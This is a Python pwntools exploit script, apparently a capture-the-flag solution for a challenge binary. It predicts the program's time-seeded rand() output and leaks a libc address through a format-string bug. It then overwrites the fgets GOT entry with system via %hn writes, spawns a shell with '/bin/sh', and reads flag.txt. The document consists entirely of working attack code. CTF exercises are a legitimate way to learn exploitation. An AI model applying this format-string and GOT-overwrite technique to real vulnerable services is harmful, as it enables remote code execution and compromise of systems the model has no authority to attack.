#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL
from math import ceil

context.terminal = ["kitty", "@launch", "--location=split"]
exe = context.binary = ELF(args.EXE or '../dist/chall')
if args.LOCAL:
    libc = ELF("/usr/lib/libc.so.6.dbg")
else:
    libc = ELF(libcdb.search_by_build_id(
    "a43bfc8428df6623cd498c9c0caeb91aec9be4f9"))
dll = CDLL("libc.so.6")

host = args.HOST or '0.0.0.0'
port = int(args.PORT or 10001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --


def jackpot(payload):
    dll.srand(dll.time(0))
    x = dll.rand() * dll.rand() % 0x100000000
    num = (x - 777) % 0x100000000
    io.sendlineafter(b": ", str(num).encode())
    io.sendlineafter(b"? ", payload)

io = start()

jackpot(b"%47$p")
io.recvuntil(b"You say: ")
libc.address = int(io.recvline(), 16) - libc.sym["__libc_start_call_main"] - 128
log.info(f"libc @ 0x{libc.address:x}")
assert libc.address & 0xfff == 0

fmt_offset = 15
target = exe.got["fgets"]
system = libc.sym["system"]
writes = {
    target: system & 0xffff,
    target+2: (system >> 16) & 0xffff,
}
writes = list(sorted(writes.items(), key=lambda x:x[1]))
payload = b"/bin/sh;#"
prev = len(payload)
for i, (_, v) in enumerate(writes):
    payload += f"%{v - prev}c%{fmt_offset + i}$hn".encode()
    prev = v
payload = payload.ljust(ceil(len(payload) / 8) * 8, b"\0")
for k, _ in writes:
    payload += p64(k)
jackpot(payload)

jackpot(b"cat flag.txt")

io.interactive()
